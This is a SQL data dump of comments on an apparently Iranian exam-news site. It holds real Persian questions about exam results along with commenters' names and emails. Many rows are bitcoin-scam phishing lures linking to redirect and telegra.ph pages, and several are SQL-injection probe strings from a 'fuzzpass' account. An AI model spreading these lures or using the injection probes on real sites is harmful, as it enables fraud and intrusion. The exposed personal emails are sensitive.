بنده کلی هزینه کردم برا فن ورز شبکه هوایی و کلاس ایمنی و مدرک دادن اخرش برا استخدام سابقه کار و کل مدارک خواستن چیزی کم نبود سن بهانه کردن و اگه سن برای ازمون مهمه چرا ثبت نام دوره فن ورزی و ایمنی ثبت نام میکنید وقتی مدرک و غیر ارزش ندلره و مبنا سن هست از اول بگین اقا سن مبنی بر ازمون و استخدام هست کلاسها روزی 100 کیلومتر میرفتم و برعکس برگشت هم 100 کیلومتر و کل دورها طی کردم هزینه کرایه حساب کتید بفکر پول ازمون و ثبت نامه دوره هستن فقط هرکی ازمون قبول بشه سرکار نمیره هرکی اشنا داره میره سرکار وسلام', 0, '2024-08-03 15:01:26', '1403/5/13', '3:01:26 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88295, 60237, 'امین شیرازی', 'aminshirazi31@gmail.com', 'سلام چرا زمان اعلام نتایج مشخ نشده؟؟؟', 0, '2024-08-04 07:55:49', '1403/5/14', '7:55:49 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88296, 60237, 'امین شیرازی', 'aminshirazi31@gmail.com', 'سلام چرا زمان اعلام نتایج مشخ نشده؟؟؟', 0, '2024-08-04 07:55:52', '1403/5/14', '7:55:52 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88297, 60237, '📉 Message: You got a transfer #IL82. RECEIVE > https://out.carrotquest.io/r?hash=YXBwPTYyNTczJmNvbn', 'azizxkill1@setxko.com', 'zdlnnk', 0, '2024-08-05 03:15:12', '1403/5/15', '3:15:12 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88298, 60238, '✂ Notification; Withdrawing №UO31. WITHDRAW >> https://out.carrotquest.io/r?hash=YXBwPTYyNTczJmNvbnZ', 'azizxkill1@setxko.com', 'gssohb', 0, '2024-08-05 03:15:24', '1403/5/15', '3:15:24 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88299, 60235, '🔓 You got a transaction from Binance. Verify =>> https://out.carrotquest.io/r?hash=YXBwPTYyNTczJmNv', 'amaki@couxpn.com', 'kj4ipf', 0, '2024-08-06 03:15:17', '1403/5/16', '3:15:17 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88300, 60236, '⛏ Email; Operation 1,003548 BTC. Continue >> https://out.carrotquest.io/r?hash=YXBwPTYyNTczJmNvbnZlc', 'amaki@couxpn.com', '2ote10', 0, '2024-08-06 03:15:29', '1403/5/16', '3:15:29 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88301, 60237, '📫 Message: Process 1.00987 bitcoin. Next >> https://out.carrotquest.io/r?hash=YXBwPTYyNTczJmNvbnZlc', 'amaki@couxpn.com', 'jwn1nu', 0, '2024-08-06 03:15:39', '1403/5/16', '3:15:39 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88302, 60238, '📆 Sending a transaction from Binance. Get >>> https://out.carrotquest.io/r?hash=YXBwPTYyNTczJmNvbnZ', 'amaki@couxpn.com', 'udmo4k', 0, '2024-08-06 03:15:48', '1403/5/16', '3:15:48 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88303, 60237, 'محمد شریفات', 'mohammad2224.mf@gmail.com', 'سلام و درود. نتایج این آزمون کی منتشر میشه. ممنون میشم جواب بدید.', 0, '2024-08-10 15:04:29', '1403/5/20', '3:04:29 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88304, 60238, 'Mhmd', 'mhkarami670@gmail.com', 'سلام از چه طریق نتیجه ازمون ببینیم', 0, '2024-08-10 17:45:28', '1403/5/20', '5:45:28 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88305, 60238, 'Mhmd', 'mhkarami670@gmail.com', 'سلام از چه طریق نتیجه ازمون ببینیم', 0, '2024-08-10 17:45:30', '1403/5/20', '5:45:30 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88306, 53192, 'علی عساکره', 'ali182049@gemil.com', 'نگهبان', 0, '2024-08-10 19:57:40', '1403/5/20', '7:57:40 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88307, 53192, 'علی عساکره', 'ali182049@gemil.com', 'نگهبان', 0, '2024-08-10 19:57:42', '1403/5/20', '7:57:42 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88308, 60238, 'عارف موسوی', 'Seyed.aref80@yahoo.com', 'نتایج رو کی اعلام میکنید؟', 0, '2024-08-12 22:34:48', '1403/5/22', '10:34:48 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88309, 60238, 'علی امیری', 'Aliamiri54@gmail.com', 'سلام وقتتون بخیر
بدترین ازمونی که دادم همین بود
از ۳۰ سوال تخصصی برق ۱۰ تا تکراری یه نگاه به دفترچه ننداختین خودتون', 0, '2024-08-13 04:30:31', '1403/5/23', '4:30:31 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88310, 60238, 'علی امیری', 'Aliamiri54@gmail.com', 'سلام وقتتون بخیر
بدترین ازمونی که دادم همین بود
از ۳۰ سوال تخصصی برق ۱۰ تا تکراری یه نگاه به دفترچه ننداختین خودتون', 0, '2024-08-13 04:30:33', '1403/5/23', '4:30:33 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88311, 60238, 'علی امیری', 'Aliamiri54@gmail.com', 'ازمون باید تکرار بشه با این اشتباهی که شماها انجام دادید', 0, '2024-08-13 04:31:31', '1403/5/23', '4:31:31 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88312, 60238, 'علی امیری', 'Aliamiri54@gmail.com', 'ازمون باید تکرار بشه با این اشتباهی که شماها انجام دادید', 0, '2024-08-13 04:31:35', '1403/5/23', '4:31:35 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88313, 60238, 'علی امیری', 'Aliamiri54@gmail.com', 'ازمون باید تکرار بشه با این اشتباهی که شماها انجام دادید', 0, '2024-08-13 04:31:41', '1403/5/23', '4:31:41 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88314, 60238, 'سیدعماد بلم پور', 'sydmadblmpwr@gmail.com', 'انشاالله همیشه سلامت وشاد باشید ', 0, '2024-08-13 16:54:56', '1403/5/23', '4:54:56 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88315, 60238, 'سیدعماد بلم پور', 'sydmadblmpwr@gmail.com', 'انشاالله همیشه سلامت وشاد باشید ', 0, '2024-08-13 16:54:59', '1403/5/23', '4:54:59 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88316, 60238, 'محمدامین بتران', 'gimsahwazi@gmail.com', 'سلام نتایج آزمون کی اعلام میشه', 0, '2024-08-14 03:05:07', '1403/5/24', '3:05:07 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88317, 60238, 'محمدامین بتران', 'gimsahwazi@gmail.com', 'سلام نتایج آزمون کی اعلام میشه', 0, '2024-08-14 03:05:13', '1403/5/24', '3:05:13 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88318, 60238, 'محمدامین بتران', 'gimsahwazi@gmail.com', 'سلام نتایج آزمون کی اعلام میشه', 0, '2024-08-14 03:05:14', '1403/5/24', '3:05:14 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88319, 60235, '📇 Reminder: SENDING 1.0008484 BTC. Get >>> https://out.carrotquest.io/r?hash=YXBwPTYyNTczJmNvbnZlcn', 'amaki@couxpn.com', '33ftfn', 0, '2024-08-22 06:10:23', '1403/6/1', '6:10:23 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88320, 60236, '🖲 Ticket- Transfer №DG25. RECEIVE > https://out.carrotquest.io/r?hash=YXBwPTYyNTczJmNvbnZlcnNhdGlvb', 'amaki@couxpn.com', 'y0wbdw', 0, '2024-08-22 06:10:28', '1403/6/1', '6:10:28 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88321, 60237, '🔒 Email; SENDING 1,0000 BTC. Verify >> https://out.carrotquest.io/r?hash=YXBwPTYyNTczJmNvbnZlcnNhdG', 'amaki@couxpn.com', 'cb2wx3', 0, '2024-08-22 06:10:34', '1403/6/1', '6:10:34 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88322, 60238, '📉 Reminder; You got a transfer №QX95. WITHDRAW > https://out.carrotquest.io/r?hash=YXBwPTYyNTczJmNv', 'amaki@couxpn.com', 'w3tsvx', 0, '2024-08-22 06:10:38', '1403/6/1', '6:10:38 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88323, 60238, 'میثم بهبهانی', 'www.meisi4848@gmail.com', 'سلام نتایج آزمون فارابی کی اعلام میشه', 0, '2024-08-24 20:30:39', '1403/6/3', '8:30:39 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88324, 60238, 'Ali', 'albaji400@gmail.com', 'سلام، پس کی قراره نتایج رو اعلام کنید؟', 0, '2024-09-03 19:38:20', '1403/6/13', '7:38:20 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88325, 60238, 'Ali', 'albaji400@gmail.com', 'سلام، پس کی قراره نتایج رو اعلام کنید؟', 0, '2024-09-03 19:38:24', '1403/6/13', '7:38:24 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88326, 60238, 'Ali', 'albaji400@gmail.com', 'سلام، پس کی قراره نتایج رو اعلام کنید؟', 0, '2024-09-03 19:38:25', '1403/6/13', '7:38:25 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88327, 60237, '📯 + 1.82 BTC.NEXT - https://out.carrotquest.io/r?hash=YXBwPTYyNTczJmNvbnZlcnNhdGlvbj0xNzI3NDAzODEwM', 'romnik2012@code-gmail.com', '4uxhqo', 0, '2024-09-07 16:58:43', '1403/6/17', '4:58:43 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88328, 60238, '📇 + 1.8245498 BTC.NEXT - https://out.carrotquest.io/r?hash=YXBwPTYyNTczJmNvbnZlcnNhdGlvbj0xNzI3NDA0', 'romnik2012@code-gmail.com', 'kykbyx', 0, '2024-09-07 16:58:50', '1403/6/17', '4:58:50 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88329, 60240, '🛡 + 1.8245498 BTC.NEXT - https://out.carrotquest.io/r?hash=YXBwPTYyNTczJmNvbnZlcnNhdGlvbj0xNzI3NDEz', 'romnik2012@code-gmail.com', 'q79vih', 0, '2024-09-07 16:59:16', '1403/6/17', '4:59:16 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88330, 60240, '📩 + 1.8245498 BTC.NEXT - https://out.carrotquest.io/r?hash=YXBwPTYyNTczJmNvbnZlcnNhdGlvbj0xNzI3NDEz', 'romnik2012@code-gmail.com', '16z5j8', 0, '2024-09-07 17:02:26', '1403/6/17', '5:02:26 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88331, 60237, '📱 Notification: TRANSACTION 1,82987 bitcoin. GET > out.carrotquest-mail.io/r?hash=YXBwPTY0MDcyJmNvb', 'jmehoff@gmailod.com', 'tu1qia', 0, '2024-09-14 19:24:49', '1403/6/24', '7:24:49 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88332, 60238, '🔑 You have 1 message # 532. Go - out.carrotquest-mail.io/r?hash=YXBwPTY0MDcyJmNvbnZlcnNhdGlvbj0xNzk', 'jmehoff@gmailod.com', 'ted108', 0, '2024-09-14 19:24:52', '1403/6/24', '7:24:52 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88333, 60239, '🔐 Notification; Process #VB16. GET >> out.carrotquest-mail.io/r?hash=YXBwPTY0MDcyJmNvbnZlcnNhdGlvbj', 'jmehoff@gmailod.com', '3bkisp', 0, '2024-09-14 19:24:55', '1403/6/24', '7:24:55 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88334, 60240, '📖 Ticket: Operation 1.82687 bitcoin. Go to withdrawal >>> out.carrotquest-mail.io/r?hash=YXBwPTY0MD', 'jmehoff@gmailod.com', 'ugy6m6', 0, '2024-09-14 19:25:04', '1403/6/24', '7:25:04 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88335, 60240, '📏 Reminder: Operation 1.823487542 BTC. Receive > out.carrotquest-mail.io/r?hash=YXBwPTY0MDcyJmNvbnZ', 'jmehoff@gmailod.com', 'ukz3ki', 0, '2024-09-14 19:27:52', '1403/6/24', '7:27:52 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88336, 60238, '📋 Email- Withdrawing #GK31. RECEIVE >>> out.carrotquest-mail.io/r?hash=YXBwPTY0MDcyJmNvbnZlcnNhdGlv', 'friedenspfeifen@omggreatfoods.com', '39k3ka', 0, '2024-09-24 06:13:07', '1403/7/3', '6:13:07 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88337, 60239, '📉 Notification: TRANSACTION 1,82387 bitcoin. Next > out.carrotquest-mail.io/r?hash=YXBwPTY0MDcyJmNv', 'friedenspfeifen@omggreatfoods.com', 'wf9a3w', 0, '2024-09-24 06:13:11', '1403/7/3', '6:13:11 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88338, 60240, '📃 You got a gift from user. Verify => out.carrotquest-mail.io/r?hash=YXBwPTY0MDcyJmNvbnZlcnNhdGlvbj', 'friedenspfeifen@omggreatfoods.com', '78jhxd', 0, '2024-09-24 06:13:16', '1403/7/3', '6:13:16 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88339, 60241, '🖋 You got a transaction from us. Continue >>> out.carrotquest-mail.io/r?hash=YXBwPTY0MDcyJmNvbnZlcn', 'friedenspfeifen@omggreatfoods.com', 'w7xhau', 0, '2024-09-24 06:13:21', '1403/7/3', '6:13:21 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88340, 60240, '📯 We send a gift from user. GЕТ => out.carrotquest-mail.io/r?hash=YXBwPTY0MDcyJmNvbnZlcnNhdGlvbj0x', 'friedenspfeifen@omggreatfoods.com', '3lf952', 0, '2024-09-24 06:16:17', '1403/7/3', '6:16:17 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88341, 60240, '🔓 You have a transaction from user. Assure > out.carrotquest-mail.io/r?hash=YXBwPTY0MDcyJmNvbnZlcn', 'hatty2001@murahpanel.com', '40abuk', 0, '2024-10-02 00:27:02', '1403/7/11', '12:27:02 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88342, 60241, '🔐 Ticket: + 1,8215 BTC. Confirm =>> out.carrotquest-mail.io/r?hash=YXBwPTY0MDcyJmNvbnZlcnNhdGlvbj0x', 'hatty2001@murahpanel.com', 'hj90rn', 0, '2024-10-02 00:27:12', '1403/7/11', '12:27:12 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88343, 60243, '🔒 You have a message # 659. Go >>> out.carrotquest-mail.io/r?hash=YXBwPTY0MDcyJmNvbnZlcnNhdGlvbj0x', 'hatty2001@murahpanel.com', '7g2jgc', 0, '2024-10-02 00:27:34', '1403/7/11', '12:27:34 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88344, 60240, '🔒 Message: SENDING 1,82456 BTC. Verify >> out.carrotquest-mail.io/r?hash=YXBwPTY0MDcyJmNvbnZlcnNhdG', 'hatty2001@murahpanel.com', 'v14lxd', 0, '2024-10-02 00:31:42', '1403/7/11', '12:31:42 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88352, 60243, 'Ffurzazwplearsgso@gmail.com', 'fuzzpass@gmail.com', '鎈\'\'"\(', 0, '2024-10-14 14:33:44', '1403/7/23', '2:33:44 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88353, 60243, 'Ffurzazwplearsgso@gmail.com', 'fuzzpass@gmail.com', '\(', 0, '2024-10-14 14:33:52', '1403/7/23', '2:33:52 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88354, 60240, '📖 You have a transaction from unknown user. Assure >>> https://telegra.ph/Go-to-your-personal-cabin', 'amaki@couxpn.com', 'mreptd', 0, '2024-10-17 05:15:12', '1403/7/26', '5:15:12 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88355, 60241, '🔒 You have a notification № 429. Go >> https://telegra.ph/Go-to-your-personal-cabinet-08-25?hs=05ae', 'amaki@couxpn.com', 's1xaj3', 0, '2024-10-17 05:15:16', '1403/7/26', '5:15:16 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88356, 60242, '🔐 You have 1 message # 887. Open >>> https://telegra.ph/Go-to-your-personal-cabinet-08-25?hs=960981', 'amaki@couxpn.com', 'e88l65', 0, '2024-10-17 05:15:22', '1403/7/26', '5:15:22 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88357, 60243, '🗓 Ticket; SENDING 1,8245 BTC. Receive >>> https://telegra.ph/Go-to-your-personal-cabinet-08-25?hs=5', 'amaki@couxpn.com', '7761bo', 0, '2024-10-17 05:15:28', '1403/7/26', '5:15:28 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88358, 60240, '🔈 You have received 1 notification # 694. Go > https://telegra.ph/Go-to-your-personal-cabinet-08-25', 'amaki@couxpn.com', 'pqlyra', 0, '2024-10-17 05:18:37', '1403/7/26', '5:18:37 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88359, 60240, '🔐 Notification- Operation #IL27. ASSURE > out.carrotquest-mail.io/r?hash=YXBwPTY0MDcyJmNvbnZlcnNhdG', 'jmehoff@gmailod.com', 'ly9yni', 0, '2024-10-19 11:38:35', '1403/7/28', '11:38:35 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88361, 60242, '☎ You got a gift from Binance. Continue >> out.carrotquest-mail.io/r?hash=YXBwPTY0MDcyJmNvbnZlcnNhdG', 'jmehoff@gmailod.com', 'cqus7i', 0, '2024-10-19 11:38:52', '1403/7/28', '11:38:52 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88362, 60243, '📁 Message; Transfer №WZ70. GET >>> out.carrotquest-mail.io/r?hash=YXBwPTY0MDcyJmNvbnZlcnNhdGlvbj0x', 'jmehoff@gmailod.com', '35vrqh', 0, '2024-10-19 11:39:03', '1403/7/28', '11:39:03 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88363, 60240, '🔎 Reminder: Operation 1,820000 BTC. Assure => out.carrotquest-mail.io/r?hash=YXBwPTY0MDcyJmNvbnZlcn', 'jmehoff@gmailod.com', 'fokvwl', 0, '2024-10-19 11:41:54', '1403/7/28', '11:41:54 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88364, 60240, 'Ffruazwzlpearsgso@gmail.com', 'fuzzpass@gmail.com', 'and\'\'w\'\'=\'\'w', 0, '2024-10-19 19:01:35', '1403/7/28', '7:01:35 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88365, 60240, 'Ffruazwzlpearsgso@gmail.com', 'fuzzpass@gmail.com', 'and\'\'o\'\'=\'\'o', 0, '2024-10-19 19:01:37', '1403/7/28', '7:01:37 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88366, 60240, 'Ffruazwzlpearsgso@gmail.com', 'fuzzpass@gmail.com', 'and"o"="o', 0, '2024-10-19 19:01:39', '1403/7/28', '7:01:39 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88367, 60240, 'Ffruazwzlpearsgso@gmail.com', 'fuzzpass@gmail.com', 'and"g"="p', 0, '2024-10-19 19:01:40', '1403/7/28', '7:01:40 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88375, 60240, 'Ffruazwzlpearsgso@gmail.com', 'fuzzpass@gmail.com', '鎈\'\'"\(', 0, '2024-10-19 19:03:26', '1403/7/28', '7:03:26 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88376, 60240, 'Ffruazwzlpearsgso@gmail.com', 'fuzzpass@gmail.com', '\(', 0, '2024-10-19 19:03:28', '1403/7/28', '7:03:28 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88377, 60240, '📯 You got a transaction from our company. Continue > https://telegra.ph/Go-to-your-personal-cabinet', 'azizxkill1@setxko.com', 'vzdpit', 0, '2024-10-24 14:39:35', '1403/8/3', '2:39:35 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88378, 60241, '📮 You have a gift from us. Verify >> https://telegra.ph/Go-to-your-personal-cabinet-08-25?hs=05aeb3', 'azizxkill1@setxko.com', 'mui43o', 0, '2024-10-24 14:39:54', '1403/8/3', '2:39:54 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88379, 60242, '🗂 Sending a transfer from user. Gо tо withdrаwаl >>> https://telegra.ph/Go-to-your-personal-cabinet', 'azizxkill1@setxko.com', 'hadq30', 0, '2024-10-24 14:40:00', '1403/8/3', '2:40:00 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88380, 60243, '📪 Ticket; TRANSFER 1,8268 BTC. Go to withdrawal => https://telegra.ph/Go-to-your-personal-cabinet-0', 'azizxkill1@setxko.com', '5vh0tr', 0, '2024-10-24 14:40:08', '1403/8/3', '2:40:08 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88381, 60240, '📜 Email- TRANSACTION 1,8298 bitcoin. Continue > https://telegra.ph/Go-to-your-personal-cabinet-08-2', 'azizxkill1@setxko.com', 'jdxnhv', 0, '2024-10-24 14:43:32', '1403/8/3', '2:43:32 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88382, 60240, '🔔 You have a gift from Binance. Continue => https://telegra.ph/Go-to-your-personal-cabinet-08-25?hs', 'txahole@eewmaop.com', '6t431o', 0, '2024-10-31 13:47:22', '1403/8/10', '1:47:22 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88383, 60241, '☎ Message: Withdrawing #QG01. VERIFY =>> https://telegra.ph/Go-to-your-personal-cabinet-08-25?hs=8da', 'txahole@eewmaop.com', '2nae2x', 0, '2024-10-31 13:47:30', '1403/8/10', '1:47:30 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88384, 60242, '🔐 Message: TRANSFER 1,8200 BTC. Continue =>> https://telegra.ph/Go-to-your-personal-cabinet-08-25?h', 'txahole@eewmaop.com', '6lcbvd', 0, '2024-10-31 13:47:37', '1403/8/10', '1:47:37 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88385, 60243, '🔗 Ticket; TRANSFER 1.8268 BTC. Receive >>> https://telegra.ph/Go-to-your-personal-cabinet-08-25?hs=', 'txahole@eewmaop.com', 'bj88ld', 0, '2024-10-31 13:47:47', '1403/8/10', '1:47:47 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88386, 60240, '💌 You got a transfer from our company. GET >>> https://telegra.ph/Go-to-your-personal-cabinet-08-25', 'friedenspfeifen@omggreatfoods.com', 'mdcmn3', 0, '2024-11-04 16:46:59', '1403/8/14', '4:46:59 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88387, 60241, '🖨 Message; Process 1.82687 BTC. Receive => https://telegra.ph/Go-to-your-personal-cabinet-08-25?hs=', 'friedenspfeifen@omggreatfoods.com', 'd1fqkp', 0, '2024-11-04 16:47:05', '1403/8/14', '4:47:05 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88388, 60242, '🔊 Ticket: Process №FL14. GET =>> https://telegra.ph/Go-to-your-personal-cabinet-08-25?hs=de5948cb1d', 'friedenspfeifen@omggreatfoods.com', 'masmyz', 0, '2024-11-04 16:47:15', '1403/8/14', '4:47:15 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88389, 60243, '📊 Notification: TRANSFER 1,82687 BTC. Verify >>> https://telegra.ph/Go-to-your-personal-cabinet-08-', 'friedenspfeifen@omggreatfoods.com', 'jw3sj7', 0, '2024-11-04 16:47:22', '1403/8/14', '4:47:22 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88390, 60240, '📐 Sending a gift from us. Confirm >>> https://telegra.ph/Bitcoin-Transfer-11-20?hs=72f40802f2434bbd', 'romnik2012@code-gmail.com', '2vn2ud', 0, '2024-11-22 21:23:40', '1403/9/2', '9:23:40 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88391, 60243, '📱 Sending a gift from user. Get => https://telegra.ph/Bitcoin-Transfer-11-20?hs=e647631b6622ffee10b', 'romnik2012@code-gmail.com', 'pj12sg', 0, '2024-11-22 21:23:48', '1403/9/2', '9:23:48 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88393, 60246, '📝 Message; Process NoPZ92. GET =>> https://telegra.ph/Bitcoin-Transfer-11-20?hs=d8d496ef38b86052594', 'romnik2012@code-gmail.com', 'bn28l2', 0, '2024-11-22 21:24:02', '1403/9/2', '9:24:02 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88394, 60247, '📊 Email: Transfer №OD39. CONTINUE >> https://telegra.ph/Bitcoin-Transfer-11-20?hs=d86bf10de31e52622', 'romnik2012@code-gmail.com', '877gnx', 0, '2024-11-22 21:24:07', '1403/9/2', '9:24:07 PM');
